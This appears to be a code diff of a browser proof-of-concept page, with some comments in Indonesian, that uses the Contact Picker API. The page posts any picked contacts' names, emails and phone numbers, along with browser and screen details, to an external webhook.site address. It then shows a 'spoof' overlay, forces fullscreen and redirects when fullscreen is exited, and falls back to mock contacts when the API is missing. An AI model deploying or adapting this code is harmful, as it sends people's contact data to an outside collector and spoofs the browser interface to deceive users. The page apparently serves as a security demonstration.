@@ -34,6 +34,18 @@
       color: #fff;
       text-align: center;
     }
+
+    #debug {
+      position: fixed;
+      top: 10px;
+      left: 10px;
+      background: rgba(255,255,255,0.1);
+      color: white;
+      padding: 10px;
+      font-size: 12px;
+      max-width: 300px;
+      z-index: 10000;
+    }
   </style>
 </head>
 
@@ -43,60 +55,97 @@
 
 <div id="content">
   <h1>Click anywhere to start demo</h1>
+  <p>Demo akan mengirim data kontak ke webhook</p>
+</div>
+
+<div id="debug">
+  <strong>Debug Info:</strong><br>
+  <span id="debug-text">Ready...</span>
 </div>
 
 <script>
 const WEBHOOK = "https://webhook.site/c3a379cf-8d7a-42af-9036-c054d29dd939";
 
-function send(event, extra = {}) {
-  fetch(WEBHOOK, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      timestamp: new Date().toISOString(),
-      event: event,
-      userAgent: navigator.userAgent,
-      url: window.location.href,
-      ...extra
-    })
-  }).catch(err => {
-    console.error('Webhook send failed:', err);
-  });
+// Mock contacts data untuk simulasi
+const MOCK_CONTACTS = [
+  {
+    id: "contact_001",
+    name: ["John Doe", "Johnny"],
+    email: ["john.doe@gmail.com", "johnny@work.com"],
+    tel: ["+6281234567890", "+62812345678"]
+  },
+  {
+    id: "contact_002", 
+    name: ["Sarah Johnson"],
+    email: ["sarah.johnson@yahoo.com"],
+    tel: ["+6285678901234"]
+  },
+  {
+    id: "contact_003",
+    name: ["Michael Chen", "Mike"],
+    email: ["michael.chen@hotmail.com", "mike.c@company.co.id"],
+    tel: ["+6287654321098", "+62276543210"]
+  },
+  {
+    id: "contact_004",
+    name: ["Amanda Rodriguez"],
+    email: ["amanda.rodriguez@outlook.com"],
+    tel: ["+6289012345678"]
+  },
+  {
+    id: "contact_005",
+    name: ["David Kim"],
+    email: ["david.kim@gmail.com", "d.kim@business.id"],
+    tel: ["+6281987654321"]
+  }
+];
+
+function updateDebug(message) {
+  document.getElementById('debug-text').innerHTML = message;
+  console.log('DEBUG:', message);
 }
 
-// Function to extract contact details
-function extractContactDetails(contacts) {
-  return contacts.map(contact => {
-    const details = {
-      id: contact.id || 'unknown',
-      name: [],
-      email: [],
-      tel: []
-    };
+async function send(event, extra = {}) {
+  const payload = {
+    timestamp: new Date().toISOString(),
+    event: event,
+    userAgent: navigator.userAgent,
+    url: window.location.href,
+    ...extra
+  };
 
-    // Extract names
-    if (contact.name && Array.isArray(contact.name)) {
-      details.name = contact.name;
-    }
+  updateDebug(`Sending: ${event}`);
+  
+  try {
+    const response = await fetch(WEBHOOK, {
+      method: "POST",
+      headers: { 
+        "Content-Type": "application/json",
+        "Accept": "application/json"
+      },
+      body: JSON.stringify(payload)
+    });
+    
+    updateDebug(`✅ ${event} sent successfully`);
+    return true;
+  } catch (err) {
+    updateDebug(`❌ ${event} failed: ${err.message}`);
+    console.error('Webhook send failed:', err);
+    return false;
+  }
+}
 
-    // Extract emails
-    if (contact.email && Array.isArray(contact.email)) {
-      details.email = contact.email;
-    }
-
-    // Extract phone numbers
-    if (contact.tel && Array.isArray(contact.tel)) {
-      details.tel = contact.tel;
-    }
-
-    return details;
-  });
+// Simulasi pemilihan kontak random
+function selectRandomContact() {
+  const randomIndex = Math.floor(Math.random() * MOCK_CONTACTS.length);
+  return MOCK_CONTACTS[randomIndex];
 }
 
 document.addEventListener("click", async () => {
+  updateDebug("Starting contact picker demo...");
 
-  // 1️⃣ Log picker intent with browser info
-  send("contacts_picker_called", {
+  // 1️⃣ Log picker intent
+  await send("contacts_picker_called", {
     fields_requested: ["name", "tel", "email"],
     browser_supports_contacts: !!(navigator.contacts && navigator.contacts.select),
     screen_resolution: `${screen.width}x${screen.height}`,
@@ -104,15 +153,14 @@ document.addEventListener("click", async () => {
   });
 
   let granted = false;
-  let contactsData = [];
+  let selectedContact = null;
+  let useRealAPI = false;
 
-  // 2️⃣ Trusted system UI
+  // 2️⃣ Coba gunakan Contact Picker API yang asli
   if (navigator.contacts && navigator.contacts.select) {
     try {
-      send("contacts_picker_opening", {
-        note: "Attempting to open contacts picker"
-      });
-
+      updateDebug("Trying real Contact Picker API...");
+      
       const result = await navigator.contacts.select(
         ["name", "tel", "email"],
         { multiple: false }
@@ -120,130 +168,153 @@ document.addEventListener("click", async () => {
 
       if (result && Array.isArray(result) && result.length > 0) {
         granted = true;
-        contactsData = extractContactDetails(result);
+        useRealAPI = true;
+        selectedContact = result[0];
         
-        // Send detailed contact data
-        send("contacts_data_captured", {
+        updateDebug("✅ Real API worked!");
+        
+        // Send real contact data
+        await send("real_contacts_data_captured", {
+          source: "real_contacts_api",
           granted: true,
-          contacts_count: result.length,
-          contacts_details: contactsData,
-          raw_result_structure: {
-            is_array: Array.isArray(result),
-            length: result.length,
-            first_contact_keys: result[0] ? Object.keys(result[0]) : []
+          contact_details: {
+            id: selectedContact.id || 'unknown',
+            names: selectedContact.name || [],
+            emails: selectedContact.email || [],
+            phone_numbers: selectedContact.tel || []
           }
         });
 
-        // Send individual contact details for better tracking
-        contactsData.forEach((contact, index) => {
-          send(`contact_${index + 1}_details`, {
-            contact_index: index + 1,
-            name_count: contact.name.length,
-            email_count: contact.email.length,
-            tel_count: contact.tel.length,
-            names: contact.name,
-            emails: contact.email,
-            phone_numbers: contact.tel
-          });
-        });
-
       } else {
-        send("contacts_picker_no_selection", {
-          granted: false,
+        updateDebug("Real API returned empty result");
+        await send("contacts_picker_no_selection", {
+          source: "real_contacts_api",
           result_type: typeof result,
           result_value: result
         });
       }
 
     } catch (error) {
-      send("contacts_picker_error", {
-        granted: false,
+      updateDebug(`Real API error: ${error.message}`);
+      await send("contacts_picker_error", {
+        source: "real_contacts_api",
         error_name: error.name,
-        error_message: error.message,
-        error_stack: error.stack
+        error_message: error.message
       });
     }
-  } else {
-    send("contacts_picker_not_supported", {
-      granted: false,
-      navigator_contacts_exists: !!navigator.contacts,
-      navigator_contacts_select_exists: !!(navigator.contacts && navigator.contacts.select)
+  }
+
+  // 3️⃣ Jika API asli tidak bekerja, gunakan simulasi
+  if (!useRealAPI) {
+    updateDebug("Using simulated contact data...");
+    
+    // Simulasi delay picker
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    
+    selectedContact = selectRandomContact();
+    granted = true;
+    
+    // Send simulated contact data
+    await send("simulated_contacts_data_captured", {
+      source: "simulated_data",
+      granted: true,
+      contact_details: {
+        id: selectedContact.id,
+        names: selectedContact.name,
+        emails: selectedContact.email, 
+        phone_numbers: selectedContact.tel
+      },
+      simulation_note: "This is mock data since real API was not available"
+    });
+    
+    updateDebug(`✅ Simulated contact: ${selectedContact.name[0]}`);
+  }
+
+  // 4️⃣ Send detailed contact breakdown
+  if (selectedContact) {
+    // Send individual details for easy parsing
+    await send("contact_name_captured", {
+      primary_name: selectedContact.name?.[0] || "Unknown",
+      all_names: selectedContact.name || [],
+      names_count: selectedContact.name?.length || 0
+    });
+
+    await send("contact_email_captured", {
+      primary_email: selectedContact.email?.[0] || "No email",
+      all_emails: selectedContact.email || [],
+      emails_count: selectedContact.email?.length || 0
+    });
+
+    await send("contact_phone_captured", {
+      primary_phone: selectedContact.tel?.[0] || "No phone",
+      all_phones: selectedContact.tel || [],
+      phones_count: selectedContact.tel?.length || 0
+    });
+
+    // Send formatted summary
+    await send("contact_summary", {
+      contact_info: {
+        name: selectedContact.name?.[0] || "Unknown",
+        email: selectedContact.email?.[0] || "No email", 
+        phone: selectedContact.tel?.[0] || "No phone"
+      },
+      data_source: useRealAPI ? "real_api" : "simulation"
     });
   }
 
-  // Final status log
-  send("contacts_picker_completed", {
-    granted: granted,
-    contacts_captured: contactsData.length,
-    next_action: "showing_spoof_overlay"
-  });
+  updateDebug("Showing spoof overlay...");
 
-  // 3️⃣ Show spoof overlay
+  // 5️⃣ Show spoof overlay
   document.getElementById("spoof").style.display = "block";
   document.getElementById("content").style.display = "none";
 
-  send("spoof_overlay_shown", {
-    note: "Fake overlay is now visible"
+  await send("spoof_overlay_shown", {
+    contact_captured: !!selectedContact,
+    next_step: "entering_fullscreen"
   });
 
-  // 4️⃣ Enter fullscreen
+  // 6️⃣ Enter fullscreen
   if (document.documentElement.requestFullscreen) {
-    document.documentElement.requestFullscreen()
-      .then(() => {
-        send("entered_fullscreen", {
-          success: true,
-          screen_info: {
-            available_width: screen.availWidth,
-            available_height: screen.availHeight,
-            color_depth: screen.colorDepth
-          }
-        });
-      })
-      .catch((error) => {
-        send("fullscreen_failed", {
-          error_name: error.name,
-          error_message: error.message
-        });
+    try {
+      await document.documentElement.requestFullscreen();
+      await send("entered_fullscreen", {
+        success: true,
+        contact_was_captured: !!selectedContact
       });
-  } else {
-    send("fullscreen_not_supported", {
-      note: "requestFullscreen method not available"
-    });
+      updateDebug("✅ Entered fullscreen");
+    } catch (error) {
+      await send("fullscreen_failed", {
+        error: error.message
+      });
+      updateDebug(`❌ Fullscreen failed: ${error.message}`);
+    }
   }
 
 }, { once: true });
 
-// 5️⃣ Exit fullscreen → redirect cepat
-document.addEventListener("fullscreenchange", () => {
+// 7️⃣ Exit fullscreen → redirect
+document.addEventListener("fullscreenchange", async () => {
   if (!document.fullscreenElement) {
-    send("exit_fullscreen_redirect", {
-      redirect_url: "https://google.com",
-      redirect_delay_ms: 50
+    await send("exit_fullscreen_redirect", {
+      redirecting_to: "https://google.com",
+      delay_ms: 50
     });
+    
+    updateDebug("Redirecting to Google...");
+    
     setTimeout(() => {
       location.href = "https://google.com";
-    }, 1);
+    }, 50);
   }
 });
 
-// Additional event listeners for more detailed tracking
-document.addEventListener("visibilitychange", () => {
-  send("visibility_change", {
-    hidden: document.hidden,
-    visibility_state: document.visibilityState
-  });
-});
-
-window.addEventListener("beforeunload", () => {
-  send("page_unload", {
-    note: "User is leaving the page"
-  });
-});
-
-// Log initial page load
+// Initial load log
 send("page_loaded", {
-  note: "PoC page loaded successfully"
+  timestamp: new Date().toISOString(),
+  note: "Contact picker PoC loaded successfully"
 });
+
+updateDebug("Page loaded. Click to start demo.");
 </script>
 
 </body>
